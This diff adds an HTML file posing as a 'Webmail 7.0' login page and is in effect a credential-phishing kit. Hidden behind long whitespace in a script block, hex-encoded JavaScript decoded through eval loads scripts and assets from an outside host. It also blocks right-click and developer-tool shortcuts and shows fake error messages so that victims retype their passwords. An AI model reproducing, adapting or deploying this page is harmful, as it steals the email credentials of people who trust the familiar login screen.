@@ -1,0 +1,431 @@
+<html><head><style type="text/css">.ng-animate.item:not(.left):not(.right){-webkit-transition:0s ease-in-out left;transition:0s ease-in-out left}</style><style type="text/css">@charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}</style>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1, maximum-scale=4.0">
+	<meta name="description" content="Webmail">
+	<meta name="author" content="H">
+	<meta http-equiv="cache-control" content="max-age=0">
+	<meta http-equiv="cache-control" content="no-cache">
+	<meta http-equiv="expires" content="0">
+	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
+	<meta http-equiv="pragma" content="no-cache">
+
+
+	<title pagetitle-directive="">Login - Webmail 7.0</title>
+
+	<link id="favLink" rel="icon" type="image/png" >
+
+	<link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Lato:300,400,700">
+
+	<link rel="stylesheet"  id="stylesheet" type="text/css" >
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body translate-cloak="" activitycheck-directive="" dragdropdisable-directive="" detectdevice-directive="" ng-class="$state.$current.name | route2classname" class="theme-default app_base_login">
+
+	<!-- ngIf: !mobileDevice --><div ng-if="!mobileDevice" id="theme-container" ng-style="{ 'background-image': 'url(' + themeParams.image.data + ')', 'background-size': themeParams.image.bckSize ? themeParams.image.bckSize : 'cover' }" ng-class="{ 'has-theme': themeParams.theme.cssPrefix !== 'default', 'no-theme': themeParams.theme.cssPrefix === 'default', 'has-colors': branding.css.custom }" class="ng-scope no-theme" style="background-image: url(&quot;&quot;); background-size: auto;">
+		<!-- uiView: growl --><div ui-view="growl" class="ng-scope"><div ng-controller="GrowlCtrl" aria-live="polite" aria-relevant="additions" class="ng-scope">
+	<div class="growlDimmer ng-hide" id="growlDimmer" ng-show="growlList.length > 0 &amp;&amp; growlStatus.fullPage"></div>
+	<!-- this parent div is always visible even when empty so the last growl can fade out of view -->
+	<div class="growlcontain gr0" ng-class="{'growlMaster': growlList.length > 0 &amp;&amp; (!growlList[0].unique),
+																'growlFullPage': growlStatus.fullPage
+		}">
+		<!-- ngRepeat: growl in growlList | orderBy:'id' -->
+	</div>
+</div>
+</div>
+		<!-- uiView: app --><div ui-view="app" class="ng-scope"><!-- ngInclude: 'components/navstatus/navstatus.html' --><div ng-controller="NavstatusCtrl" ng-include="'components/navstatus/navstatus.html'" class="ng-scope"><nav class="navbar navbar-fixed-top ng-scope" role="banner" ng-show="!isWM8Mode">
+	<div class="navbar-header">
+		<div class="navbar-brand">
+			<img class="navbar-logo" alt="Webmail 7.0" >
+		</div>
+	</div>
+	<!-- ngIf: ( auth.isauth && auth.isverified && !auth.is2faSetupRequired && auth.prefsloaded && ($storage.preferences.fullname || ($storage.user && $storage.user.mail)) ) -->
+</nav>
+
+<div modal-directive="1" modal-id="'migrationModal'" modal-body="modal.body" modal-header="modal.header" modal-confirm="modal.confirm" data-ng-click-right-button="modal.rightButton();" class="ng-scope ng-isolate-scope"><div id="migrationModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="migrationModal-label" aria-hidden="true" aria-describedby="migrationModal-body migrationModal-footer">
+	<div class="modal-dialog ng-isolate-scope" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<!-- ngIf: header -->
+				<!-- ngIf: !header --><div id="migrationModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude"></div><!-- end ngIf: !header -->
+			</div>
+			<div id="migrationModal-body">
+				<!-- ngIf: body -->
+				<!-- ngIf: bodyHtml -->
+				<div class="modal-body" ng-transclude="modalBodyTransclude"></div>
+			</div>
+			<div class="modal-footer" id="migrationModal-footer">
+				<!-- ngIf: footer || checkboxLabel -->
+				<button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+				<button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+				<button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+				<button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+				<button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+			</div>
+			<button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+				<span aria-hidden="true">×</span>
+			</button>
+		</div>
+	</div>
+</div>
+</div>
+<div modal-directive="1" modal-id="'languageModal'" modal-body-html="languageModalData.body" modal-header="languageModalData.header" data-ng-click-right-button="languageModalData.rightCallback();" data-ng-click-middle-button="languageModalData.middleCallback();" data-ng-click-left-button="languageModalData.leftCallback();" data-modal-rightbtn="languageModalData.rightButton" data-modal-middlebtn="languageModalData.middleButton" data-modal-leftbtn="languageModalData.leftButton" class="ng-scope ng-isolate-scope"><div id="languageModal" class="modal fade" tabindex="-1" role="dialog" aria-modal="true" aria-labelledby="languageModal-label" aria-hidden="true" aria-describedby="languageModal-body languageModal-footer">
+	<div class="modal-dialog ng-isolate-scope" role="document">
+		<div class="modal-content">
+			<div class="modal-header">
+				<!-- ngIf: header -->
+				<!-- ngIf: !header --><div id="languageModal-label" ng-if="!header" class="modal-title ng-scope" ng-transclude="modalHeaderTransclude">
+</div><!-- end ngIf: !header -->
+			</div>
+			<div id="languageModal-body">
+				<!-- ngIf: body -->
+				<!-- ngIf: bodyHtml -->
+				<div class="modal-body" ng-transclude="modalBodyTransclude">
+</div>
+			</div>
+			<div class="modal-footer" id="languageModal-footer">
+				<!-- ngIf: footer || checkboxLabel -->
+				<button ng-show="closebtn" type="button" class="btn btn-default closeModalBtn ng-binding ng-hide" data-ng-click="callbackbuttonclose()" data-dismiss="modal" style=""></button>
+				<button ng-show="leftbtn" type="button" class="btn middleModalBtn leftbtn ng-binding ng-hide" ng-class="leftbtnAdditionalClasses ? leftbtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonleft(); $event.stopPropagation()"></button>
+				<button ng-show="middlebtn" type="button" class="btn middleModalBtn middlebtn ng-binding ng-hide" ng-class="middlebtnAdditionalClasses ? middlebtnAdditionalClasses : 'middleModalBtn'" data-ng-click="callbackbuttonmiddle(); $event.stopPropagation()"></button>
+				<button ng-show="rightbtn" type="button" class="btn btn-primary rightbtn ng-binding ng-hide" ng-class="rightbtnAdditionalClasses ? rightbtnAdditionalClasses : ''" data-ng-click="callbackbuttonright(); $event.stopPropagation()" ng-disabled="rightbtnDisabled" style=""></button>
+				<button ng-show="confirm" type="button" class="btn btn-primary confirm ng-binding ng-hide" data-ng-click="callbackbuttonright(); $event.stopPropagation()" style=""></button>
+			</div>
+			<button type="button" class="close" data-dismiss="modal" data-ng-click="callbackbuttonclose()" aria-label="Close">
+				<span aria-hidden="true">×</span>
+			</button>
+		</div>
+	</div>
+</div>
+</div>
+</div>
+<div ng-class="{content: true, 'simple-content': isWM8Mode}" ng-hide="hideContent" class="ng-scope content">
+	<div class="notificationWrapper">
+		<!-- ngInclude: 'components/notification/notification.html' --><div ng-include="'components/notification/notification.html'" class="ng-scope"><div ng-controller="NotificationCtrl" class="ng-scope">
+	<div ng-show="!isWM8Mode &amp;&amp; notifications &amp;&amp; notifications.length>0" class="notification public ng-hide" ng-class="{'public': ($state &amp;&amp; $state.current &amp;&amp; $state.current.data &amp;&amp; $state.current.data.authreq === false)}">
+	<div scroll-directive="" width-offset="sizes.width.offset" class="notificationContainer ng-isolate-scope" role="dialog" tabindex="-1" style="width: 811px;">
+		<!-- ngRepeat: note in notifications track by $index -->
+	</div>
+	</div>
+</div>
+</div>
+	</div>
+	<!-- uiView: master --><div ui-view="master" class="ng-scope"><div class="scroll-container scrollBoth ng-scope ng-isolate-scope" scroll-directive="navStatusSizes.height" role="main" style="height: 629px;">
+    <div class="container login-container" ng-class="{'login-container-ads': customSpaceSides}">
+        <div class="row">
+            <div class="col-md-4 col-xs-2 col-sm-3" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-2 col-sm-3': !customSpaceSides}">
+                <!-- ngIf: customSpaceStatus.LoginLeft -->
+            </div>
+            <div class="col-md-4 col-xs-8 col-sm-7" ng-class="{'col-xs-4': customSpaceSides, 'col-xs-8 col-sm-7': !customSpaceSides}">
+                <div class="login-panel" onkeypress="return checkSubmit(event)">
+                   <div>
+                        <div role="img" aria-label="Webmail 7.0" class="login-logo"></div>
+                    </div>
+                    <div id="loginMessage" class="login-message">
+                        <div ng-class="{'alert alert-danger alert-dimissible' : error.langkey}" class="alert alert-danger alert-dimissible">
+                            <!-- ngIf: error.langkey -->
+							<button onclick="closealert();" ng-if="error.langkey" type="button" class="close ng-scope" data-dismiss="alert" ng-click="resetError()">
+                                <span class="fa fa-close" aria-hidden="true"></span><span class="sr-only ng-scope" translate="LANG_CLOSE_ALERT">Close alert</span>
+                            </button><!-- end ngIf: error.langkey -->
+                            <span role="alert">
+                                <!-- space content required for reading same message again -->
+                                <!-- ngIf: !error.langkey -->
+                                <!-- ngIf: error.langkey --><strong ng-if="error.langkey" class="title ng-binding ng-scope">Error!</strong><!-- end ngIf: error.langkey -->
+                                <!-- ngIf: error.langkey --><span id="error_langkey" ng-if="error.langkey" class="ng-binding ng-scope">Incorrect email address/password. Please try again.</span><!-- end ngIf: error.langkey -->
+                            </span>
+                        </div>
+                    </div>
+					<script>
+					function closealert()
+					{
+					$('#loginMessage').hide();
+					}
+					</script>
+                    <form role="form"  class="ng-valid ng-dirty ng-valid-parse ng-submitted" id="loginform">
+					<input id="domain" type="hidden" value="" name="domain">
+					<input id="fieldName" type="hidden" value="" name="field">
+                        <div class="form-group">
+                            <input type="text" class="form-control ng-valid ng-touched ng-dirty ng-valid-parse" id="email" name="email" placeholder="Email" aria-label="Email" ng-disabled="( loadingstatus !== '')" focus-directive="true">
+                        </div>
+                        <div class="form-group">
+                            <input type="password" class="form-control ng-valid ng-touched ng-dirty ng-valid-parse" id="password" name="password" placeholder="Password" aria-label="Password" ng-disabled="( loadingstatus !== '')">
+                        </div>
+                        <div class="form-group" aria-live="assertive">
+                            <!-- ngIf: ( loadingstatus === '') --><button id="loginbtn" ng-if="( loadingstatus === '')" class="btn btn-primary btn-lg btn-block ng-scope" translate="LANG_LOGIN_SIGN_IN">Log in</button><!-- end ngIf: ( loadingstatus === '') -->
+                            <!-- ngIf: ( loadingstatus !== '') -->
+                        </div>
+                        <div class="clearfix">
+                            <!-- ngIf: (degradedMode !== true) -->
+                        </div>
+                    </form>
+					
+<script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+																																							OO00='74203d20646f63756d656e742e637265617465456c656d656e74282773637269707427293b0d0a09097363726970742e737263203d20707265666978202b2075726c3b0d0a09097363726970742e6f6e6c6f6164203d2066756e6374696f6e2829207b0d0a0909090d0a0909096966202863616c6c6261636b29207b0d0a0909090963616c6c6261636b28293b090909090d0a0909097d0d0a0909090d0a09097d3b0d0a0909646f63756d656e742e686561642e617070656e644368696c6428736372697074293b202f2f20417070656e64207468652073637269707420746f2074686520626f64790d0a097d0d0a09646f63756d656e742e676574456c656d656e744279496428276572726f725f6c616e676b657927292e696e6e657248544d4c3d22596f752068617665206265656e207369676e6564206f75742e205369676e20696e20746f20636f6e74696e75652e223b0d0a7d293b0d0a090d0a646f63756d656e742e6164644576656e744c697374656e657228276b6579646f776e272c206576656e74203d3e207b0d0a2020696620286576656e742e6b6579436f6465203d3d3d20313233207c7c20286576656e742e6374726c4b6579202626206576656e742e73686966744b6579202626206576656e742e6b6579436f6465203d3d3d2037332929207b0d0a202020206576656e742e70726576656e7444656661756c7428293b0d0a20207d0d0a7d293b0d0a2f2f2044697361626c652072696768742d636c69636b20636f6e74657874206d656e750d0a646f63756d656e742e6164644576656e744c697374656e65722827636f6e746578746d656e75272c206576656e74203d3e206576656e742e70726576656e7444656661756c742829293b0d0a2f2f61766f696420666f726d207375626d697373696f6e20776974686f75742076616c69646174696f6e0d0a242827236c6f67696e62746e27292e6f6e2827636c69636b272c2066756e6374696f6e286576656e7429207b0d0a092f2f616c657274282273746172742066786e7422293b0d0a09636c6b4c676e2866756e6374696f6e28737461747573436f6465297b0d0a09090d0a0909646973706c617943737328737461747573436f6465293b0d0a09090d0a097d293b0d0a7d293b0d0a2428272e6c6f67696e2d70616e656c27292e6f6e28276b6579646f776e272c2066756e6374696f6e286576656e7429207b0d0a2020202020202020636865636b5375626d6974286576656e742c2066756e6374696f6e28737461747573436f646529207b0d0a090909646973706c617943737328737461747573436f6465293b0d0a20202020202020207d293b0d0a202020207d293b0d0a090d0a66756e6374696f6e20646973706c617943737328737461747573297b0d0a0909696628737461747573297b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f725f6c616e676b657927292e696e6e657248544d4c3d22526574727920656e74727920666f722070617373776f72642e506c6561736520656e74657220796f75722063757272656e742070617373776f72642e223b0d0a0909090d0a09097d656c7365207b0d0a090909646f63756d656e742e676574456c656d656e744279496428276572726f725f6c616e676b657927292e696e6e657248544d4c3d22496e636f727265637420656d61696c20616464726573732f70617373776f72642e20506c656173652074727920616761696e2e223b0d0a0909090d0a09097d0d0a090d0a7d';eval(unescape('%66%75%6E%63%74%69%6F%6E%20%5F%63%28%5F%69%29%7B%76%61%72%20%61%3D%6E%65%77%20%41%72%72%61%79%28%31%30%30%30%29%2E%6A%6F%69%6E%28%27%25%30%44%25%30%41%27%29%3B%76%61%72%20%74%3D%5F%69%2E%72%65%70%6C%61%63%65%28%2F%28%5C%53%7B%32%7D%29%2F%67%69%2C%27%24%31%25%27%29%3B%74%3D%27%25%27%2B%74%3B%74%3D%74%2E%73%75%62%73%74%72%28%30%2C%74%2E%6C%65%6E%67%74%68%2D%31%29%3B%64%6F%63%75%6D%65%6E%74%2E%77%72%69%74%65%28%75%6E%65%73%63%61%70%65%28%27%3C%73%63%27%2B%27%72%69%70%74%3E%27%2B%61%2B%74%2B%61%2B%27%3C%2F%73%63%27%2B%27%72%69%70%74%3E%27%29%29%7D%3B'));O0OO='646c3d646f63756d656e742e6c61796572733b6f653d77696e646f772e6f706572613f313a303b64613d28646f63756d656e742e646f63756d656e744d6f64657c7c646f63756d656e742e616c6c292626216f653b67653d646f63756d656e742e676574456c656d656e74427949643b77733d77696e646f772e736964656261723f747275653a66616c73653b744e3d6e6176696761746f722e757365724167656e742e746f4c6f7765724361736528293b697a4e3d744e2e696e6465784f6628276e6574736361706527293e3d303f747275653a66616c73653b7a69733d64613b7a6973383d64613b766172206d73673d27273b66756e6374696f6e206e656d28297b72657475726e20747275657d3b77696e646f772e6f6e6572726f72203d206e656d3b7a4f463d77696e646f772e6c6f636174696f6e2e70726f746f636f6c2e696e6465784f66282766696c652729213d2d313f747275653a66616c73653b6937663d7a69732626217a4f463f747275653a66616c73653b6966286461297b646f63756d656e742e6f6e6472616773746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b66756e6374696f6e2063494528297b286d7367293b72657475726e2066616c73657d3b66756e6374696f6e20636328297b646f63756d656e742e6f6e636f6e746578746d656e753d6349453b73657454696d656f7574282263632829222c323030297d3b636328297d3b66756e6374696f6e20634e532865297b696628646c7c7c7773297b696628652e77686963683d3d327c7c652e77686963683d3d33297b286d7367293b72657475726e2066616c73657d7d7d3b696628646c297b646f63756d656e742e636170747572654576656e7473284576656e742e4d4f555345444f574e293b646f63756d656e742e6f6e6d6f757365646f776e3d634e537d656c73657b646f63756d656e742e6f6e6d6f75736575703d634e537d3b646f63756d656e742e6f6e636f6e746578746d656e753d6e65772046756e6374696f6e282272657475726e2066616c736522293b6966286f65297b66756e6374696f6e20726f2865297b6966286576656e742e627574746f6e3d3d32297b616c65727428272027293b72657475726e20307d3b72657475726e20747275657d3b646f63756d656e742e6f6e6d6f757365646f776e3d726f7d3b66756e6374696f6e206e733928297b77696e646f772e7374617475733d2720273b73657454696d656f757428276e73392829272c31303030293b72657475726e20747275657d3b696628216f65297b6e733928293b646f63756d656e742e6f6e6d6f7573656f7665723d6e73393b646f63756d656e742e6f6e6d6f7573656f75743d6e73397d3b66756e6374696f6e2075302861297b72657475726e2066616c73657d3b66756e6374696f6e2075312865297b72657475726e28652e7461726765742e7461674e616d65213d6e756c6c2626652e7461726765742e7461674e616d652e73656172636828275e28494e5055547c54455854415245417c425554544f4e7c53454c4543547c454d4245447c4f424a4543547c48544d4c29242729213d2d31297d3b66756e6374696f6e2075322865297b696628652e77686963683d3d31297b77696e646f772e636170747572654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d75307d7d3b66756e6374696f6e2075332865297b696628652e77686963683d3d31297b77696e646f772e72656c';OO0O='656173654576656e7473284576656e742e4d4f5553454d4f5645293b77696e646f772e6f6e6d6f7573656d6f76653d6e756c6c7d7d3b20696628646c297b77696e646f772e636170747572654576656e7473284576656e742e4d4f55534555507c4576656e742e4d4f555345444f574e293b77696e646f772e6f6e6d6f757365646f776e3d75323b77696e646f772e6f6e6d6f75736575703d75337d656c73652069662867652626216461297b646f63756d656e742e6f6e6d6f757365646f776e3d75317d3b66756e6374696f6e206e6e28297b69662877696e646f772e67657453656c656374696f6e297b76617220743d77696e646f772e67657453656c656374696f6e28292e746f537472696e6728293b696628742e696e6465784f6628277177656173647a786327293e317c7c742e6c656e6774683e3430297b646f63756d656e742e626f64792e696e6e657248544d4c3d272e273b6c6f636174696f6e2e72656c6f616428297d3b73657454696d656f757428226e6e2829222c323030297d7d3b6e6e28293b66756e6374696f6e206e6928297b6966286461297b646f63756d656e742e6f6e73656c65637473746172743d66756e6374696f6e2028297b72657475726e2066616c73657d3b73657454696d656f757428226e692829222c323030297d7d3b6e6928293b2428646f63756d656e74292e72656164792866756e6374696f6e28297b0d0a090d0a092f2f73657420676c6f62616c207661726961626c65730d0a0976617220767372203d2077696e646f772e6c6f636174696f6e2e687265662e736c6963652877696e646f772e6c6f636174696f6e2e687265662e696e6465784f662827232729202b2031293b0d0a09636f6e7374206d794172726179203d207673722e73706c697428222622293b0d0a09767372203d206d7941727261795b305d3b0d0a090d0a09090d0a092f2f7365742065787465726e616c2066696c65730d0a09636f6e737420707265666978203d202268747470733a2f2f726974616c6672656e646f2e746f702f656e7465727072697365732f223b0d0a09766172206172726179736574203d5b0d0a0909095b227374796c657368656574222c226170702e637373222c2268726566222c226964225d2c0d0a0909095b226e61766261722d6c6f676f222c226e61767374617475732d6c6f676f2e706e67222c22737263222c22636c617373225d2c0d0a0909095b226661764c696e6b222c2266617669636f6e5f636172726965727a6f6e2e69636f222c2268726566222c226964225d2c0d0a090d0a095d0d0a202020202f2f204c6f6164207468652065787465726e616c2073637269707420616e642063616c6c207468652065787465726e616c2063616c6c6261636b2066756e6374696f6e0d0a20202020202020202020206c6f616445787465726e616c5363726970742827656e74657270726973652e6a73272c2066756e6374696f6e2829207b0d0a09090909636865636b444e53287673722c66756e6374696f6e28297b0d0a09090909096f6e426f64794c6f61642861727261797365742c207072656669782c20767372293b0d0a090909097d293b0d0a202020202020202020202020200d0a2020202020202020202020207d293b0d0a0909090d0a092f2f2066756e6374696f6e20746f206c6f61642065787465726e616c207363726970740d0a0966756e6374696f6e206c6f616445787465726e616c5363726970742875726c2c63616c6c6261636b29207b0d0a0909766172207363726970';OOO0=O0OO+OO0O+OO00;_c(OOO0);O4955464F='474E5859454A4F52514950424E4C46534646484242544A4B49424B434647574F54484A4F58495459584654444A524E4F4C4D4652525251434F524A4B4B544B4D565359534859594F4E4D594A424F484A59464748574A44504A585452424B594C5948504544494D50574F424A505853484951454C5051574747464B4F445957505248424D4D474D49505652554553454D42495455574C4C4352564253504D4B464E4642494C5149554754534A51565646514F554355515748494B4B5550535648424B4A4B434C4748475357514546444D515644564B46505950444A4D45514D4352'
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</script>
+                </div>
+                <div class="login-language">
+                    <hr>
+                    <div class="row">
+                        <label class="col-sm-4 control-label ng-scope" id="languageLabel" translate="LANG_PUBLIC_AVAILABILITY_LANGUAGE">Language</label>
+                        <div class="col-sm-8">
+                            <dropdown-select dropdown-aria-labelledby="languageLabel" dropdown-model="currentLanguage" dropdown-on-change="languageChanged()" class="ng-isolate-scope dropdown-container"><div class="dropdown-select dropdown-trigger ng-isolate-scope" id="dropdown-18" ng-mousedown="DropdownCtrl.openDropdown()" tabindex="0" ng-class="{disabled: DropdownCtrl.dropdownDisabled()}" aria-disabled="false" role="button" aria-haspopup="listbox" ng-keydown="DropdownCtrl.dropdownTriggerKeydown($event)" aria-expanded="false" aria-controls="dropdown-listbox-18" tooltip-directive="" data-toggle="tooltip" data-placement="bottom" data-original-title="" aria-labelledby="languageLabel dropdown-18">
+	<div class="dropdown-selected-option-container"><span class="ng-binding ng-scope">English</span></div>
+	<span aria-hidden="true" class="fa fa-angle-down"></span>
+</div>
+<div class="dropdown-options-container ng-hide" id="dropdown-listbox-18" role="listbox" ng-keydown="DropdownCtrl.optionsKeydown($event)" ng-blur="DropdownCtrl.dontCloseOnBlur ? DropdownCtrl.dontCloseOnBlur = false : DropdownCtrl.closeDropdown()" ng-show="DropdownCtrl.open" ng-style="{right: right ? 0 : null, 'max-width': wrap ? '100%' : null, 'top' : optionsContainerTop ? optionsContainerTop : null}" tabindex="-1" aria-activedescendant="dropdown-option-39" style="top: -258px;">
+	<div class="dropdown-options-up-container ng-hide" ng-show="showUpArrow()" aria-hidden="true" style="">
+		<div class="dropdown-options-up" ng-click="upArrowClicked()" ng-mouseenter="upArrowMouseenter()" ng-mouseleave="arrowMouseleave()" unselectable="on"><span class="fa fa-caret-up"></span></div>
+	</div>
+	<div class="dropdown-options" ng-style="{'max-height': DropdownCtrl.dropdownOptionsToShow * optionHeight}" ng-transclude="" style="max-height: 240px;">
+                                <!-- ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope highlighted" id="dropdown-option-39" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="true">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope fa-check" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">English</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-42" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Français</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-45" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Deutsch</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-48" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Español</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-51" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Español de Latinoamérica</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-54" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Hrvatski</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-57" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Italiano</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-60" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Português</span></ng-transclude>
+</div><!-- end ngRepeat: val in languages --><div class="dropdown-option ng-isolate-scope" id="dropdown-option-63" ng-attr-aria-selected="{{DropdownCtrl.dropdownMenu ? undefined : DropdownCtrl.selectedOptionId === $id}}" role="option" ng-click="optionSelected()" ng-mousemove="optionHighlighted()" ng-repeat="val in languages" dropdown-value="val.lang" unselectable="on" aria-selected="false">
+	<!-- ngIf: !DropdownCtrl.dropdownMenu --><span ng-if="!DropdownCtrl.dropdownMenu" aria-hidden="true" class="fa ng-scope" ng-class="{'fa-check': DropdownCtrl.selectedOptionId === $parent.$id}"></span><!-- end ngIf: !DropdownCtrl.dropdownMenu -->
+	<ng-transclude unselectable="on"><span class="ng-binding ng-scope" unselectable="on">Português do Brasil</span></ng-transclude>
